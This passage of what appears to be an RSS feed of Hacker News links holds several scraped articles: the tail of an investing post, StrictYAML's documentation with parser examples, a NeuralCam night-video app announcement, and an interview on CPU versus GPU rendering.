the magic of compounding and dollar cost averaging will do the rest.</strong></p><p><a href="https://twitter.com/carlosbaraza">Follow me on Twitter @carlosbaraza</a> if you like this type of content and I'll make more.</p><p>Other notes:</p><ul><li>The difference between investing daily, monthly and even yearly is pretty much negligible long term. Short term, it makes a bigger difference, being daily the best approach if your broker offers zero commissions.</li><li>This strategy depends on the market continuing appreciating. If the market was ever to reverse permanently, this strategy, and pretty much every strategy would fail.</li></ul><p>I am not a professional investor, nor a financial advisor, and arguably not even a good amateur investor 😜. This is just a simple experiment I run because I waste a lot of time and energy monitoring the market. </p>
                </div>
            </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://carlosbaraza.com/should-i-buy-the-dip/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24870336</guid>
            <pubDate>Fri, 23 Oct 2020 15:15:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[StrictYAML]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24869991">thread link</a>) | @fanf2
<br/>
October 23, 2020 | https://hitchdev.com/strictyaml/ | <a href="https://web.archive.org/web/*/https://hitchdev.com/strictyaml/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
		<div>
			

			





<p>StrictYAML is a <a href="https://en.wikipedia.org/wiki/Type_safety">type-safe</a> YAML parser
that parses and validates a <a href="https://hitchdev.com/strictyaml/features-removed">restricted subset</a> of the <a href="https://hitchdev.com/strictyaml/what-is-yaml">YAML</a>
specification.</p>

<p>Priorities:</p>

<ul>
<li>Beautiful API</li>
<li>Refusing to parse <a href="https://hitchdev.com/strictyaml/features-removed">the ugly, hard to read and insecure features of YAML</a> like <a href="https://hitchdev.com/strictyaml/why/implicit-typing-removed">the Norway problem</a>.</li>
<li>Strict validation of markup and straightforward type casting.</li>
<li>Clear, readable exceptions with <strong>code snippets</strong> and <strong>line numbers</strong>.</li>
<li>Acting as a near-drop in replacement for pyyaml, ruamel.yaml or poyo.</li>
<li>Ability to read in YAML, make changes and write it out again with comments preserved.</li>
<li><a href="https://hitchdev.com/strictyaml/why/speed-not-a-priority">Not speed</a>, currently.</li>
</ul>

<p>Simple example:</p>
<div><pre><code data-lang="yaml"><span># All about the character</span><span>
</span><span></span>name<span>:</span><span> </span>Ford<span> </span>Prefect<span>
</span><span></span>age<span>:</span><span> </span><span>42</span><span>
</span><span></span>possessions<span>:</span><span>
</span><span></span>-<span> </span>Towel</code></pre></div><div><pre><code data-lang="python"><span>from</span> <span>strictyaml</span> <span>import</span> <span>load</span><span>,</span> <span>Map</span><span>,</span> <span>Str</span><span>,</span> <span>Int</span><span>,</span> <span>Seq</span><span>,</span> <span>YAMLError</span></code></pre></div>
<p>Default parse result:</p>
<div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>load</span><span>(</span><span>yaml_snippet</span><span>)</span>
<span>YAML</span><span>(</span><span>OrderedDict</span><span>([(</span><span>'name'</span><span>,</span> <span>'Ford Prefect'</span><span>),</span> <span>(</span><span>'age'</span><span>,</span> <span>'42'</span><span>),</span> <span>(</span><span>'possessions'</span><span>,</span> <span>[</span><span>'Towel'</span><span>])]))</span></code></pre></div>
<p>All data is string, list or OrderedDict:</p>
<div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>load</span><span>(</span><span>yaml_snippet</span><span>)</span><span>.</span><span>data</span>
<span>OrderedDict</span><span>([(</span><span>'name'</span><span>,</span> <span>'Ford Prefect'</span><span>),</span> <span>(</span><span>'age'</span><span>,</span> <span>'42'</span><span>),</span> <span>(</span><span>'possessions'</span><span>,</span> <span>[</span><span>'Towel'</span><span>])])</span></code></pre></div>
<p>Quickstart with schema:</p>
<div><pre><code data-lang="python"><span>from</span> <span>strictyaml</span> <span>import</span> <span>load</span><span>,</span> <span>Map</span><span>,</span> <span>Str</span><span>,</span> <span>Int</span><span>,</span> <span>Seq</span><span>,</span> <span>YAMLError</span>

<span>schema</span> <span>=</span> <span>Map</span><span>({</span><span>"name"</span><span>:</span> <span>Str</span><span>(),</span> <span>"age"</span><span>:</span> <span>Int</span><span>(),</span> <span>"possessions"</span><span>:</span> <span>Seq</span><span>(</span><span>Str</span><span>())})</span></code></pre></div>
<p>42 is now parsed as an integer:</p>
<div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>person</span> <span>=</span> <span>load</span><span>(</span><span>yaml_snippet</span><span>,</span> <span>schema</span><span>)</span>
<span>&gt;&gt;&gt;</span> <span>person</span><span>.</span><span>data</span>
<span>OrderedDict</span><span>([(</span><span>'name'</span><span>,</span> <span>'Ford Prefect'</span><span>),</span> <span>(</span><span>'age'</span><span>,</span> <span>42</span><span>),</span> <span>(</span><span>'possessions'</span><span>,</span> <span>[</span><span>'Towel'</span><span>])])</span></code></pre></div>
<p>A YAMLError will be raised if there are syntactic problems, violations of your schema or use of disallowed YAML features:</p>
<div><pre><code data-lang="yaml"><span># All about the character</span><span>
</span><span></span>name<span>:</span><span> </span>Ford<span> </span>Prefect<span>
</span><span></span>age<span>:</span><span> </span><span>42</span></code></pre></div>
<p>For example, a schema violation:</p>
<div><pre><code data-lang="python"><span>try</span><span>:</span>
    <span>person</span> <span>=</span> <span>load</span><span>(</span><span>yaml_snippet</span><span>,</span> <span>schema</span><span>)</span>
<span>except</span> <span>YAMLError</span> <span>as</span> <span>error</span><span>:</span>
    <span>print</span><span>(</span><span>error</span><span>)</span></code></pre></div><div><pre><code data-lang="yaml">while<span> </span>parsing<span> </span>a<span> </span>mapping<span>
</span><span>  </span>in<span> </span><span>"&lt;unicode string&gt;"</span><span>,</span><span> </span>line<span> </span><span>1</span><span>,</span><span> </span>column<span> </span><span>1</span><span>:</span><span>
</span><span>    </span><span># All about the character</span><span>
</span><span>     </span>^<span> </span>(line<span>:</span><span> </span><span>1</span>)<span>
</span><span></span>required<span> </span>key(s)<span> </span><span>'possessions'</span><span> </span>not<span> </span>found<span>
</span><span>  </span>in<span> </span><span>"&lt;unicode string&gt;"</span><span>,</span><span> </span>line<span> </span><span>3</span><span>,</span><span> </span>column<span> </span><span>1</span><span>:</span><span>
</span><span>    </span>age<span>:</span><span> </span><span>'42'</span><span>
</span><span>    </span>^<span> </span>(line<span>:</span><span> </span><span>3</span>)</code></pre></div>
<p>If parsed correctly:</p>
<div><pre><code data-lang="python"><span>from</span> <span>strictyaml</span> <span>import</span> <span>load</span><span>,</span> <span>Map</span><span>,</span> <span>Str</span><span>,</span> <span>Int</span><span>,</span> <span>Seq</span><span>,</span> <span>YAMLError</span>

<span>schema</span> <span>=</span> <span>Map</span><span>({</span><span>"name"</span><span>:</span> <span>Str</span><span>(),</span> <span>"age"</span><span>:</span> <span>Int</span><span>(),</span> <span>"possessions"</span><span>:</span> <span>Seq</span><span>(</span><span>Str</span><span>())})</span></code></pre></div>
<p>You can modify values and write out the YAML with comments preserved:</p>
<div><pre><code data-lang="python"><span>person</span> <span>=</span> <span>load</span><span>(</span><span>yaml_snippet</span><span>,</span> <span>schema</span><span>)</span>
<span>person</span><span>[</span><span>'age'</span><span>]</span> <span>=</span> <span>43</span>
<span>print</span><span>(</span><span>person</span><span>.</span><span>as_yaml</span><span>())</span></code></pre></div><div><pre><code data-lang="yaml"><span># All about the character</span><span>
</span><span></span>name<span>:</span><span> </span>Ford<span> </span>Prefect<span>
</span><span></span>age<span>:</span><span> </span><span>43</span><span>
</span><span></span>possessions<span>:</span><span>
</span><span></span>-<span> </span>Towel</code></pre></div>
<p>As well as look up line numbers:</p>
<div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>person</span> <span>=</span> <span>load</span><span>(</span><span>yaml_snippet</span><span>,</span> <span>schema</span><span>)</span>
<span>&gt;&gt;&gt;</span> <span>person</span><span>[</span><span>'possessions'</span><span>][</span><span>0</span><span>]</span><span>.</span><span>start_line</span>
<span>5</span></code></pre></div>
<h2 id="install">Install</h2>

<h2 id="why-strictyaml">Why StrictYAML?</h2>

<p>There are a number of formats and approaches that can achieve more or
less the same purpose as StrictYAML. I’ve tried to make it the best one.
Below is a series of documented justifications:</p>

<ul>
<li><a href="https://hitchdev.com/strictyaml/why-not/json-schema">Why not use JSON Schema for validation?</a></li>
<li><a href="https://hitchdev.com/strictyaml/why-not/toml">What is wrong with TOML?</a></li>
<li><a href="https://hitchdev.com/strictyaml/why-not/turing-complete-code">Why shouldn’t I just use python code for configuration?</a></li>
<li><a href="https://hitchdev.com/strictyaml/why-not/json5">Why not JSON5?</a></li>
<li><a href="https://hitchdev.com/strictyaml/why-not/json">Why not JSON for simple configuration files?</a></li>
<li><a href="https://hitchdev.com/strictyaml/why-not/environment-variables-as-config">Why avoid using environment variables as configuration?</a></li>
<li><a href="https://hitchdev.com/strictyaml/why-not/xml">Why not use XML for configuration or DSLs?</a></li>
<li><a href="https://hitchdev.com/strictyaml/why-not/ini">Why not use INI files?</a></li>
<li><a href="https://hitchdev.com/strictyaml/why-not/ordinary-yaml">Why not use the YAML 2.0 standard? - we don’t need a new standard!</a></li>
<li><a href="https://hitchdev.com/strictyaml/why-not/python-schema">Why not use python’s schema library (or similar) for validation?</a></li>
<li><a href="https://hitchdev.com/strictyaml/why-not/hocon">Why not HOCON?</a></li>
<li><a href="https://hitchdev.com/strictyaml/why-not/sdlang">Why not use SDLang?</a></li>
<li><a href="https://hitchdev.com/strictyaml/why-not/pykwalify">Why not use kwalify with standard YAML to validate my YAML?</a></li>
</ul>

<h2 id="using-strictyaml">Using StrictYAML</h2>

<p>How to:</p>

<ul>
<li><a href="https://hitchdev.com/strictyaml/using/alpha/howto/merge-yaml-documents">Merge YAML documents</a></li>
<li><a href="https://hitchdev.com/strictyaml/using/alpha/howto/build-yaml-document">Build a YAML document from scratch in code</a></li>
<li><a href="https://hitchdev.com/strictyaml/using/alpha/howto/roundtripping">Reading in YAML, editing it and writing it back out</a></li>
<li><a href="https://hitchdev.com/strictyaml/using/alpha/howto/what-line">Get line numbers of YAML elements</a></li>
<li><a href="https://hitchdev.com/strictyaml/using/alpha/howto/either-or-validation">Either/or schema validation of different, equally valid different kinds of YAML</a></li>
<li><a href="https://hitchdev.com/strictyaml/using/alpha/howto/label-exceptions">Labeling exceptions</a></li>
<li><a href="https://hitchdev.com/strictyaml/using/alpha/howto/without-a-schema">Parsing YAML without a schema</a></li>
<li><a href="https://hitchdev.com/strictyaml/using/alpha/howto/revalidation">Revalidate an already validated document</a></li>
</ul>

<p>Compound validators:</p>

<ul>
<li><a href="https://hitchdev.com/strictyaml/using/alpha/compound/mapping-yaml-object">Using a YAML object of a parsed mapping</a></li>
<li><a href="https://hitchdev.com/strictyaml/using/alpha/compound/mapping-with-slug-keys">Mapping with defined keys and a custom key validator (Map)</a></li>
<li><a href="https://hitchdev.com/strictyaml/using/alpha/compound/mapping">Mappings with defined keys (Map)</a></li>
<li><a href="https://hitchdev.com/strictyaml/using/alpha/compound/update">Updating document with a schema</a></li>
<li><a href="https://hitchdev.com/strictyaml/using/alpha/compound/optional-keys">Validating optional keys in mappings (Map)</a></li>
<li><a href="https://hitchdev.com/strictyaml/using/alpha/compound/map-pattern">Mappings with arbitrary key names (MapPattern)</a></li>
<li><a href="https://hitchdev.com/strictyaml/using/alpha/compound/optional-keys-with-defaults">Optional keys with defaults (Map/Optional)</a></li>
<li><a href="https://hitchdev.com/strictyaml/using/alpha/compound/sequences">Sequence/list validator (Seq)</a></li>
<li><a href="https://hitchdev.com/strictyaml/using/alpha/compound/sequences-of-unique-items">Sequences of unique items (UniqueSeq)</a></li>
<li><a href="https://hitchdev.com/strictyaml/using/alpha/compound/fixed-length-sequences">Fixed length sequences (FixedSeq)</a></li>
</ul>

<p>Scalar validators:</p>

<ul>
<li><a href="https://hitchdev.com/strictyaml/using/alpha/scalar/empty">Empty key validation</a></li>
<li><a href="https://hitchdev.com/strictyaml/using/alpha/scalar/datetime">Datetimes (Datetime)</a></li>
<li><a href="https://hitchdev.com/strictyaml/using/alpha/scalar/float">Floating point numbers (Float)</a></li>
<li><a href="https://hitchdev.com/strictyaml/using/alpha/scalar/email-and-url">Email and URL validators</a></li>
<li><a href="https://hitchdev.com/strictyaml/using/alpha/scalar/comma-separated">Parsing comma separated items (CommaSeparated)</a></li>
<li><a href="https://hitchdev.com/strictyaml/using/alpha/scalar/integer">Integers (Int)</a></li>
<li><a href="https://hitchdev.com/strictyaml/using/alpha/scalar/decimal">Decimal numbers (Decimal)</a></li>
<li><a href="https://hitchdev.com/strictyaml/using/alpha/scalar/boolean">Boolean (Bool)</a></li>
<li><a href="https://hitchdev.com/strictyaml/using/alpha/scalar/regular-expressions">Validating strings with regexes (Regex)</a></li>
<li><a href="https://hitchdev.com/strictyaml/using/alpha/scalar/string">Parsing strings (Str)</a></li>
<li><a href="https://hitchdev.com/strictyaml/using/alpha/scalar/enum">Enumerated scalars (Enum)</a></li>
</ul>

<p>Restrictions:</p>

<ul>
<li><a href="https://hitchdev.com/strictyaml/using/alpha/restrictions/disallowed-yaml">Disallowed YAML</a></li>
<li><a href="https://hitchdev.com/strictyaml/using/alpha/restrictions/loading-dirty-yaml">Dirty load</a></li>
<li><a href="https://hitchdev.com/strictyaml/using/alpha/restrictions/duplicate-keys">Duplicate keys</a></li>
</ul>

<h2 id="design-justifications">Design justifications</h2>

<p>There are some design decisions in StrictYAML which are controversial
and/or not obvious. Those are documented here:</p>

<ul>
<li><a href="https://hitchdev.com/strictyaml/why/speed-not-a-priority">Why is parsing speed not a high priority for StrictYAML?</a></li>
<li><a href="https://hitchdev.com/strictyaml/why/syntax-typing-bad">What is syntax typing?</a></li>
<li><a href="https://hitchdev.com/strictyaml/why/node-anchors-and-references-removed">What is wrong with node anchors and references?</a></li>
<li><a href="https://hitchdev.com/strictyaml/why/duplicate-keys-disallowed">What is wrong with duplicate keys?</a></li>
<li><a href="https://hitchdev.com/strictyaml/why/explicit-tags-removed">What is wrong with explicit tags?</a></li>
<li><a href="https://hitchdev.com/strictyaml/why/implicit-typing-removed">The Norway Problem - why StrictYAML refuses to do implicit typing and so should you</a></li>
<li><a href="https://hitchdev.com/strictyaml/why/not-parse-direct-representations-of-python-objects">Why does StrictYAML not parse direct representations of python objects?</a></li>
<li><a href="https://hitchdev.com/strictyaml/why/only-parse-strings-not-files">Why does StrictYAML only parse from strings and not files?</a></li>
<li><a href="https://hitchdev.com/strictyaml/why/turing-complete-schema">Why does StrictYAML make you define a schema in python - a turing complete language?</a></li>
<li><a href="https://hitchdev.com/strictyaml/why/flow-style-removed">What is wrong with flow style YAML?</a></li>
</ul>

<h2 id="star-contributors">Star Contributors</h2>

<ul>
<li>@wwoods</li>
</ul>

<h2 id="contributors">Contributors</h2>

<ul>
<li>@gvx</li>
<li>@AlexandreDecan</li>
<li>@lots0logs</li>
<li>@tobbez</li>
<li>@jaredsampson</li>
<li>@BoboTIG</li>
</ul>

<h2 id="contributing">Contributing</h2>

<ul>
<li><p>Before writing any code, please read the tutorial on <a href="https://hitchdev.com/approach/contributing-to-hitch-libraries/">contributing to hitchdev libraries</a>.</p></li>

<li><p>Before writing any code, if you’re proposing a new feature, please raise it on github. If it’s an existing feature / bug, please comment and briefly describe how you’re going to implement it.</p></li>

<li><p>All code needs to come accompanied with a story that exercises it or a modification to an existing story. This is used both to test the code and build the documentation.</p></li>
</ul>


			

			
		</div>
	</article></div>]]>
            </description>
            <link>https://hitchdev.com/strictyaml/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24869991</guid>
            <pubDate>Fri, 23 Oct 2020 14:43:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dream Machine: MiSTer FPGA]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24869975">thread link</a>) | @snvzz
<br/>
October 23, 2020 | https://felixleger.com/posts/20201018-misterfpga/ | <a href="https://web.archive.org/web/*/https://felixleger.com/posts/20201018-misterfpga/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://felixleger.com/posts/20201018-misterfpga/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24869975</guid>
            <pubDate>Fri, 23 Oct 2020 14:41:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On Our Abusive Relationship with Mozilla’s Firefox]]>
            </title>
            <description>
<![CDATA[
Score 88 | Comments 115 (<a href="https://news.ycombinator.com/item?id=24869658">thread link</a>) | @zdw
<br/>
October 23, 2020 | https://ruzkuku.com/txt/moz-rel.html | <a href="https://web.archive.org/web/*/https://ruzkuku.com/txt/moz-rel.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://ruzkuku.com/txt/moz-rel.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24869658</guid>
            <pubDate>Fri, 23 Oct 2020 14:09:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Video Night Mode with real-time AI-powered denoising and frame boosting]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24869657">thread link</a>) | @soonpls
<br/>
October 23, 2020 | https://neural.cam/news/nightvideo/ | <a href="https://web.archive.org/web/*/https://neural.cam/news/nightvideo/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <div id="main">
    <div>
      <div>
        <div role="article">

          <div>
            

<p>Hey everyone, <br>

for the past few months we have been working on a new product, and today we’re finally ready to show it to you.
</p>

<div><p>As you probably know, at NeuralCam we have a <a href="https://apps.apple.com/us/app/neuralcam-nightmode/id1474856599" target="_blank">photo NightMode app</a> that’s recognized as the leading night mode solution for iPhones without a built-in photo Night Mode. Ever since the launch of our night mode app, a question kept popping up from our users: <i>“can you build a night mode app for video?”</i>, they asked. 
</p><p>

We’ve pondered this for a while. Unlike photography, there is no obvious straightforward way to build night mode for video. In the case of photos, night mode usually means taking multiple shots with relatively long exposure and combining them into one high quality image. Then brightening and post-processing it for a final look. 

 </p></div>



<p><b>Video</b> is a different beast: you can’t just shoot multiple frames and combine them because you’re limited by both the maximum exposure time a frame can have and by the maximum processing time per frame (milliseconds instead of seconds in the case of real-time video). 

</p>

<p>Clearly, a very different approach is needed. We’ve explored everything from classic to AI-powered video processing techniques and we think we found the right mix of tech that results in much improved low light videos. After months of researching, hacking and developing, we’re proud to present NeuralCam NightVideo, our (and perhaps the world’s first) <b>Video Night Mode</b> app.

</p>
<p><img src="https://neural.cam/news/nightvideo/content/nvid.png">
</p>
<br>

<h3 id="when-they-ghost-mid-project">Night Mode Video</h3>

<p>So how can we build Video NightMode? Where do we get started and why can’t we just take a normal video and brighten it up? Well, because it would look really bad.
</p>

<p>The biggest problem in low light videography (and photography for that matter) is the presence of noise. There’s just too little amount of light hitting the image sensor and this lack of information results in a flickering mess of pixels with different light intensities and colors appearing especially in the darker areas of the scene - not a pleasant view.
</p>
<p>In the case of the photography night mode, this noise is reduced by the mentioned frame merging process - which basically results in more information being added to the target frame. However, with video we don’t have the luxury of multiple frames and processing for seconds to do the processing so we’ll clearly have to find a very different approach. 

</p><h3 id="when-they-ghost-mid-project">Capturing and AI frame-boosting</h3>

<p>The first thing we’re doing is to try to capture the most light inside each frame, which naturally results in less noisy frames. 

</p>

<p>As a standard practice, videos are shot at a shutter speed of no more than 1/24 to keep moving objects sharp and the video smooth. But this also means that this is the maximum amount of time that light can reach the sensor.
</p>

<p>We’ve looked very closely at this problem and figured that there might be a way to let more light in while maintaining the smooth look of the video, namely a combination of longer exposure times and frame interpolation. This way we can use exposure times longer than 1/24 depending on the amount of available light, and then in order to keep the video looking smooth, we generate additional frames using a proprietary Machine Learning powered Video Interpolation algorithm that we’ve built especially for this purpose.</p>

<p>
 The result is a smooth video with a tiny amount of blur - depending on the used settings - and generally a nice “night video” look.

</p>

<p><img src="https://neural.cam/news/nightvideo/content/interp.png">
<br>
</p>



<h3 id="when-they-ghost-mid-project">AI Powered Video Denoising</h3>


<p>Doing the capturing part this way we’ve got higher quality frames, but these generally still have a lot of noise so what we’ll do next is to try to get rid of that.
</p>

<p>It turns out that classic denoising methods aren’t good enough for this case, they usually blur the whole image, including edges and are helpless at the noise levels present in low light shots taken with a smartphone camera. Also, they’re quite slow as well.
</p>

<p>To solve this problem we’ve built a Machine Learning-based denoising algorithm. Specially developed for the iPhone camera, it removes even the heaviest noise and does so selectively and adaptively only on the areas of the image where noise is present. The result is a much cleaner look in the bright areas of the video and a massive reduction of the ugly flickering effect in the darker parts of the image. 
</p>
<p> <video width="700" autoplay="" muted="" no-controls="" loop=""> 
<source src="https://neural.cam/news/nightvideo/content/denoise.mp4" type="video/mp4">
Your browser does not support the video tag.</video>
<br>
</p>

<h3>Brightening</h3>


<p>As a final step after the capturing, interpolation and denoising, it’s finally possible to brighten up the image and get a good looking, smooth video as the result. The amount of brightening applied depends on the selected mode.</p>

<h3>Different Video Night Modes</h3>


<p>As a final step after the capturing, interpolation and denoising, it’s finally possible to brighten up the image and get a good looking, smooth video as the result. The amount of brightening applied depends on the selected mode.</p>
<p> <video width="700" autoplay="" muted="" no-controls="" loop=""> 
<source src="https://neural.cam/news/nightvideo/content/nightvideo.mp4" type="video/mp4">
Your browser does not support the video tag.</video>
<br>
</p>
<p>In order to cover as many shooting situations as possible we’ve come up with 5 different capture modes:

</p>



<h4>Day:
</h4>



<p>The first capturing mode is not even a night mode at all. It is targeted at lower light day shots, or scenes with high dynamic range where the results of the default iPhone camera start to get too noisy. This mode contains no brightening, but because of the use of our AI denoising algorithm, resulting videos have a cleaner, more pleasant look. It’s especially useful when used with the ultra wide camera, in the case of which noise can appear even in medium-lit indoor situations.

</p>

<h4>Dusk:</h4>

<p>
  
  This mode is designed for semi-low light. It is similar to Day mode, shot at a high frame rate to maintain sharp subjects in high movement situations, but in addition to denoising it also includes a bit of additional brightening. 

</p>
<h4>
Night:
</h4>

<p>The “Night” mode is the default mode for shooting night videos. It uses a slightly longer exposure time, that combined with our denoising and frame interpolation algorithms generates a bright, clean and smooth night video. This is the mode to use for most night scenes. 
</p>

<p> <video width="700" autoplay="" muted="" no-controls="" loop=""> 
<source src="https://neural.cam/news/nightvideo/content/building.mp4" type="video/mp4">
Your browser does not support the video tag.</video>
<br>
</p>


<h4>Night+:</h4>

<p>A further enhanced mode for really dark scenes. In this mode, videos have an additional amount of blur but provide a brighter night video with the same clean noise-less look. In most of these situations the built-in camera can't produce usable results.

</p>

<h4>Time-lapse:</h4>

<p>A Night Time-lapse mode, similar to the one on the new iPhone 12 default camera - now made available by NeuralCam NightVideo for older iPhones too. This mode doesn’t have sound and can handle even lower light situations, which combined with a faster playback, generates the specific night mode time-lapse look. 

</p>

<p> <video width="700" autoplay="" muted="" no-controls="" loop=""> 
<source src="https://neural.cam/news/nightvideo/content/timelapse.mp4" type="video/mp4">
Your browser does not support the video tag.</video>
<br>
</p>

<h4>*Gentle Light:</h4>

<p>Each of the modes can be combined with the “gentle light” feature, where the app turns on the flashlight, but at one of the lowest levels in order to keep the resulting video still natural and avoid “blinding” people. Gentle light can be used in totally dark scenes with subjects that are close enough to be illuminated by a small amount of light.
</p>

<h3>Real-time on-device processing</h3>

<p>All this processing runs in real-time on the iPhone, making full use of the power the NeuralEngine provides. This real-time processing means that we can provide the same instant video capturing experience you’re used to with your default camera - tap to capture and everything is displayed and processed on the fly. Since this level of video processing requires quite some processing power, NightVideo is only available on devices with the A12 NeuralEngine (iPhone XR and later) and iOS 14.


</p><p>

  With real-time processing and modes covering everything from slightly low light settings to really dark scenes, NeuralCam NightVideo is the first app to provide Night Mode for Video.
</p>


<div><p>You can purchase the NeuralCam NightVideo app from the App Store, using the link below. Make sure to send us all your feedback over at <a href="mailto:hello@neural.cam">hello@neural.cam</a> - we'd love to hear from you.</p></div>

</div></div></div></div></div></div></div>]]>
            </description>
            <link>https://neural.cam/news/nightvideo/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24869657</guid>
            <pubDate>Fri, 23 Oct 2020 14:09:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CPU vs. GPU: A Discussion about Hardware Acceleration and Rendering (2015)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24869443">thread link</a>) | @fruty
<br/>
October 23, 2020 | https://fruty.io/2015/01/15/cpu-vs-gpu-a-discussion-about-hardware-acceleration-and-rendering/ | <a href="https://web.archive.org/web/*/https://fruty.io/2015/01/15/cpu-vs-gpu-a-discussion-about-hardware-acceleration-and-rendering/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>(Interview of Prof. Dr. Philipp Slusallek, accomplished scientist and veteran from the computer graphics field, performed in January 2015 for Seekscale company, a cloud rendering startup)</p>



<p>Hardware acceleration is hot in rendering industry right now, and while people still try to figure out how to split workloads between CPUs and GPUs, FPGAs are quickly rising. We interviewed Philipp Slusallek, Scientific Director and Computer Graphics professor at Saarland University, and talked about what’s hot right now, and above all what we can expect in CG in the near future! We first heard about Philipp by coming across this great <a href="http://www.scarydevil.com/~peter/io/raytracing-vs-rasterization.html" target="_blank" rel="noreferrer noopener">discussion</a>.</p>



<p><strong>– What rendering techniques are best adapted to each hardware (GPU/CPU)?</strong></p>



<p>We basically have two key algorithms for rendering: rasterization and ray tracing. Rasterization is a “forward” rendering approach that renders the triangles in a scene one by one (conceptually) and each time updates all pixels covered by that triangle. Ray tracing, on the other hand, traces rays for each pixel to find out which triangle is visible for that pixel.</p>



<p>While the two seem very different, there are intermediate versions, such as “tile-based rasterization” or “frustum tracing”, where only the triangles covering a part of the screen are rasterized or all rays of a tile a traced together, respectively. If you make these tiles smaller, eventually a single pixel in size, rasterization starts to look much like ray tracing and vice versa as you trace larger and larger frusta. However, we still do not have algorithms that really cover the whole range of options well.</p>



<p>Additionally, we are seeing an increased need for advanced (programmable) shading and lighting effects (e.g. global illumination for smooth indirect illumination). While they are sitting on top of the core renderer, they impose many requirements that will determine what rendering approach can or cannot be used.</p>



<p>On the HW (hardware) side: GPUs started as HW dedicated for rasterization. But they have long evolved to become essentially large parallel compute engines (with some dedicated HW thrown in for rasterization, still). On the other hand, CPUs have become much better at parallel workloads with multi-core, multi-threading, and more and increasingly wide SIMD compute units (MMX, SSE, AVX, and the now upcoming AVX-512).</p>



<p>In some sense the two general HW designs are converging towards a similar sweet spot, but coming from two very different starting points.</p>



<p>Rasterization is more dependent on good HW support to be fast and so runs best on GPUs. Ray-tracing can be implemented with very good performance on each HW architecture, probably with some advantage for CPU-like architectures if you look at the latest comparison in the Embree paper at Siggraph 2014 (which may be a bit biased).</p>



<p><strong>– For a developer working on a renderer, what is the technical arbitrage between writing for a CPU, and for a GPU?</strong></p>



<p>Let me focus on writing a full ray tracing renderer using the raw HW. Writing a “renderer” that makes good use of OpenGL/DirectX is a very different story.</p>



<p>First of all writing a really good renderer is a big challenge — but also a lot of fun, independent of the choice of rendering algorithm or HW. It reaches across many levels from highly optimized inner loops all the way up to data management of often complex scenes. It thus touches many aspects of HW and SW and is a perfect poster child for how to best design efficient code for certain HW architectures.</p>



<p>An obvious key element is strongly optimizing the inner loops of a renderer as it determines the upper limit of the achievable rendering performance. This is where a lot of efforts and research has been, and still is, spent. Today, getting the best performance usually still means to hand-optimize the code (at the assembly or intrinsics level) for specific architectures and different choices of renderer configurations. While this often pays off, it requires expert knowledge, is very tedious, and often needs to be completely rewritten as the HW or the requirements change.</p>



<p>In addition, there are also many interdependencies between choices made at this low levels and the various levels of algorithms above it. This means that one needs to keep the code flexible in order for it to adapt to these requirements. However, with current technology, flexibility conflicts strongly with achieving optimal performance.</p>



<p>As a result of all this, almost all renderers have been targeting only one HW architecture: GPUs or CPUs and even within such an architecture, algorithms might have to be configured very differently on different instances. While cross-plattform renderers have been developed, e.g. in OpenCL, OpenCL is still a very low-level language that is not well suited for all HW architectures thus limiting what can be achieved.</p>



<p>In contrast, the hardware vendors each support renderer development with their HW-specific frameworks: Nvidia’s Optix is focused essentially only on GPUs, while Intel’s Embree targets CPU-like architectures (including their MIC/Xeon Phi processors). One interesting note is that both tools (and others) had to develop their own compiler technology to develop these frameworks. While both of these frameworks are very good choices they are black boxes that each come with their own set of drawbacks and limitations.</p>



<p>Already in 2008 we showed that with the right language/compiler tools high optimization of low-level code does not necessarily limit flexibility of the overall design. Our RTFact system [HPG 2008] used C++ template metaprogramming to specialize generic code from across several levels of abstraction at compile time. With this framework, we were able to easily configure very different renderers based on the same generic code and still achieve performance within about 10% of our previous hand-optimized code in each case — which was really remarkable. Unfortunately, writing the core code via C++ template metaprogramming is really hard and results in “write-only code” that is really hard to maintain. But it showed that performance and flexibility are NOT mutually exclusive!</p>



<p>Since then we have teamed up with one of the best compiler research group here at Saarland University (Prof. Sebastian Hack) and have jointly developed “AnyDSL”: It picks up the original idea of RTfact, generalizes it beyond just rendering, and uses much improved compiler technology to implement automatic specialization of generic code. AnyDSL provides a completely new programming models that offers developers a way for formulating hierarchies of conceptual abstractions while still allowing the compiler to eliminate any overhead usually associated with such abstractions (e.g. virtual function calls in C++).</p>



<p>This finally allows for writing completely generic code at each level of abstraction, specifying how that code should make use of abstractions at the lower levels. Finally, at the lowest level, code that has been coming from the different levels is combined and aggressively specialized using novel compiler algorithms to essentially interpret and partially execute any code that is knows at compile time. This is so effective because at these low level a lot of information that we abstracted from at the high levels is now available, such as information about the HW and the context in which some generic high-level code should be executed and which can be taken into account by the compiler. This approach combined the flexibility of hierarchical abstractions with the ability to generate optimized code that rival and often actually exceed the performance of hand-optimized code.</p>



